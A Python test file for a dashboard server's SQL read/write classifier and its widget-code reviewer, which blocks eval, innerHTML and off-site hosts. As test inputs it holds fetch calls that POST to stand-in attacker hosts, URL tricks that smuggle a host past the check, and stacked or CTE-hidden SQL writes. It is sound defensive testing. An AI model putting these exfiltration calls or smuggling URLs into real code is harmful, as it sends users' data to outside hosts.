"""Publish-time widget checks and SQL statement classification.

Standalone, like every other test here: no pytest, no network, no credentials.
Both modules are pure functions over strings, which is the whole reason the
checks live in them rather than inline in the routes.
"""

import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "server"))

from services.sql_safety import classify_statement, is_write_statement, strip_noise  # noqa: E402
from services.widget_safety import offending_hosts as _offending_hosts  # noqa: E402
from services.widget_safety import review_widget as _review_widget  # noqa: E402
from services.widget_safety import review_widget_code as _review_widget_code  # noqa: E402


# The approved-app list is passed explicitly so no test reads the settings table.
APP = "smart-system-prod-1526721948438476.aws.databricksapps.com"


def offending_hosts(code, app_hosts=()):
    return _offending_hosts(code, app_hosts=app_hosts)


def review_widget_code(code, app_hosts=()):
    return _review_widget_code(code, app_hosts=app_hosts)


def review_widget(code, data_source="", data_source_type="none", is_executable=False):
    return _review_widget(code, data_source, data_source_type, is_executable, app_hosts=())

_passed = 0
_failed = 0


def check(name, condition):
    global _passed, _failed
    if condition:
        _passed += 1
        print(f"PASS {name}")
    else:
        _failed += 1
        print(f"FAIL {name}")


# --------------------------------------------------------------- sql_safety

def test_plain_select_is_a_read():
    check("test_plain_select_is_a_read", classify_statement("SELECT a FROM t")[0] == "read")


def test_cte_is_a_read():
    sql = "WITH x AS (SELECT 1) SELECT * FROM x"
    check("test_cte_is_a_read", classify_statement(sql)[0] == "read")


def test_show_and_describe_are_reads():
    check(
        "test_show_and_describe_are_reads",
        classify_statement("SHOW TABLES")[0] == "read"
        and classify_statement("DESCRIBE t")[0] == "read",
    )


def test_each_write_verb_is_caught():
    for verb, sql in (
        ("insert", "INSERT INTO t VALUES (1)"),
        ("update", "UPDATE t SET a = 1"),
        ("delete", "DELETE FROM t"),
        ("merge", "MERGE INTO t USING s ON t.id = s.id"),
        ("drop", "DROP TABLE t"),
        ("grant", "GRANT SELECT ON t TO `x`"),
    ):
        kind, found = classify_statement(sql)
        if kind != "write" or found != verb:
            check(f"test_each_write_verb_is_caught[{verb}]", False)
            return
    check("test_each_write_verb_is_caught", True)


def test_a_write_hiding_behind_a_cte_is_caught():
    # The leading verb is READ here, which is exactly why presence anywhere —
    # not just position one — is what disqualifies a statement.
    sql = "WITH x AS (SELECT 1) INSERT INTO t SELECT * FROM x"
    check("test_a_write_hiding_behind_a_cte_is_caught", is_write_statement(sql))


def test_a_second_statement_is_caught():
    check(
        "test_a_second_statement_is_caught",
        is_write_statement("SELECT 1; DROP TABLE t"),
    )


def test_a_write_word_inside_a_literal_is_not_a_write():
    # The action-correlation comment and ordinary string data both contain words
    # that would otherwise read as verbs.
    sql = "/* cc-action: abc-123 */ SELECT * FROM t WHERE note = 'please update me'"
    check("test_a_write_word_inside_a_literal_is_not_a_write", classify_statement(sql)[0] == "read")


def test_a_column_named_like_a_verb_is_not_a_write():
    sql = "SELECT update_ts, `delete` FROM t"
    check("test_a_column_named_like_a_verb_is_not_a_write", classify_statement(sql)[0] == "read")


def test_comments_are_removed_before_classifying():
    check(
        "test_comments_are_removed_before_classifying",
        "drop" not in strip_noise("SELECT 1 -- drop table t").lower(),
    )


def test_an_unknown_opening_verb_is_treated_as_a_write():
    # Ambiguity resolves to the restrictive answer, not the convenient one.
    kind, _ = classify_statement("FROB t")
    check("test_an_unknown_opening_verb_is_treated_as_a_write", kind == "write")


def test_empty_is_neither():
    check(
        "test_empty_is_neither",
        classify_statement("   ")[0] == "empty" and not is_write_statement(""),
    )


# ------------------------------------------------------------ widget_safety

def test_clean_widget_passes():
    code = """
    const C = () => {
      const [d, setD] = React.useState([]);
      React.useEffect(() => { fetch('/api/sql/execute-raw'); }, []);
      return <div className="h-full w-full text-slate-800" />;
    };
    export default C;
    """
    check("test_clean_widget_passes", review_widget_code(code) == [])


def test_eval_is_refused():
    check("test_eval_is_refused", len(review_widget_code("const x = eval('1+1');")) == 1)


def test_inner_html_is_refused():
    check("test_inner_html_is_refused", len(review_widget_code("el.innerHTML = v;")) == 1)


def test_allowlisted_cdn_passes():
    code = "const [ok] = useScript('https://cdn.jsdelivr.net/npm/highcharts@11.4.8/highcharts.js', 'Highcharts');"
    check("test_allowlisted_cdn_passes", review_widget_code(code) == [])


def test_offsite_host_is_refused():
    code = "const [ok] = useScript('https://evil.example.com/x.js', 'X');"
    check("test_offsite_host_is_refused", offending_hosts(code) == {"evil.example.com"})


def test_offsite_fetch_is_refused():
    # Not only script loads: exfiltration is a fetch, and the rule is about the
    # host rather than about which API reaches it.
    code = "fetch('https://evil.example.com/collect', { method: 'POST' });"
    check("test_offsite_fetch_is_refused", offending_hosts(code) == {"evil.example.com"})


def test_an_approved_databricks_app_may_be_embedded():
    code = f"const C = () => <iframe src={{'https://{APP}/'}} className=\"h-full w-full\" />;"
    check("test_an_approved_databricks_app_may_be_embedded", review_widget_code(code, app_hosts=[APP]) == [])


def test_an_unlisted_databricks_app_is_refused():
    # databricksapps.com is shared by every Databricks customer, so being on it
    # proves nothing about who owns the app.
    code = "fetch('https://attacker-999.aws.databricksapps.com/collect');"
    problems = review_widget_code(code, app_hosts=[APP])
    check(
        "test_an_unlisted_databricks_app_is_refused",
        len(problems) == 1 and "attacker-999" in problems[0] and "Admin Panel" in problems[0],
    )


def test_no_databricks_app_is_approved_by_default():
    check("test_no_databricks_app_is_approved_by_default", offending_hosts(f"'https://{APP}/'") == {APP})


def test_a_lookalike_databricks_app_host_is_refused():
    code = f"fetch('https://{APP}.attacker.example/x');"
    check(
        "test_a_lookalike_databricks_app_host_is_refused",
        offending_hosts(code, app_hosts=[APP]) == {f"{APP}.attacker.example"},
    )


WORKSPACE = "*-1526721948438476.aws.databricksapps.com"


def test_a_workspace_entry_admits_its_own_apps():
    check(
        "test_a_workspace_entry_admits_its_own_apps",
        offending_hosts(f"'https://{APP}/'; 'https://other-app-1526721948438476.aws.databricksapps.com/'",
                        app_hosts=[WORKSPACE]) == set(),
    )


def test_a_workspace_entry_admits_nothing_else():
    # Another customer can name an app after our workspace ID, but Databricks
    # appends *their* ID; and a dotted prefix or empty name is not an app.
    for host in ("evil-1526721948438476-999999999.aws.databricksapps.com",
                 "x-91526721948438476.aws.databricksapps.com",
                 f"evil.{APP}",
                 "-1526721948438476.aws.databricksapps.com",
                 "x-1526721948438476.gcp.databricksapps.com"):
        if offending_hosts(f"'https://{host}/'", app_hosts=[WORKSPACE]) != {host}:
            check(f"test_a_workspace_entry_admits_nothing_else[{host}]", False)
            return
    check("test_a_workspace_entry_admits_nothing_else", True)


def test_only_exact_app_hosts_reach_the_csp():
    from services.widget_safety import csp_app_hosts
    check("test_only_exact_app_hosts_reach_the_csp", csp_app_hosts([WORKSPACE, APP]) == [APP])


def test_a_query_or_fragment_does_not_make_a_host():
    # A suffix rule read `evil.example?.databricksapps.com` as a Databricks App;
    # the browser sends it to evil.example.
    for code in ("fetch('https://evil.example?x.databricksapps.com');",
                 "fetch('https://evil.example#x.databricksapps.com');"):
        if offending_hosts(code, app_hosts=[APP]) != {"evil.example"}:
            check("test_a_query_or_fragment_does_not_make_a_host", False)
            return
    check("test_a_query_or_fragment_does_not_make_a_host", True)


def test_a_backslash_cannot_smuggle_a_host_past_the_check():
    # Browsers read `\` as `/`, so this goes to evil.example, not the CDN.
    for code in ("fetch('https://evil.example\\\\@cdn.jsdelivr.net/x');",
                 "fetch('https://evil.example\\u0040cdn.jsdelivr.net/x');"):
        if offending_hosts(code) != {"evil.example"}:
            check("test_a_backslash_cannot_smuggle_a_host_past_the_check", False)
            return
    check("test_a_backslash_cannot_smuggle_a_host_past_the_check", True)


def test_a_url_in_a_comment_does_not_trip_the_check():
    check(
        "test_a_url_in_a_comment_does_not_trip_the_check",
        offending_hosts("// see https://internal.example.com/docs\nconst a = 1;") == set(),
    )


def test_a_comment_marker_inside_a_url_is_not_a_comment():
    # The regression this scanner exists for: naive comment stripping eats the
    # rest of the line from '//' in 'https://', losing the host entirely.
    code = "useScript('https://cdn.jsdelivr.net/npm/x.js', 'X'); eval('nope');"
    problems = review_widget_code(code)
    check(
        "test_a_comment_marker_inside_a_url_is_not_a_comment",
        len(problems) == 1 and "eval(" in problems[0],
    )


def test_writing_sql_requires_an_executable_widget():
    problems = review_widget("const C = () => null;", "DELETE FROM t", "sql", is_executable=False)
    check(
        "test_writing_sql_requires_an_executable_widget",
        len(problems) == 1 and "changes data" in problems[0],
    )


def test_writing_sql_is_fine_when_executable():
    check(
        "test_writing_sql_is_fine_when_executable",
        review_widget("const C = () => null;", "DELETE FROM t", "sql", is_executable=True) == [],
    )


def test_reading_sql_needs_nothing():
    check(
        "test_reading_sql_needs_nothing",
        review_widget("const C = () => null;", "SELECT 1", "sql", is_executable=False) == [],
    )


for _name, _fn in sorted(list(globals().items())):
    if _name.startswith("test_") and callable(_fn):
        _fn()

print(f"\n{_passed} passed, {_failed} failed")
sys.exit(1 if _failed else 0)
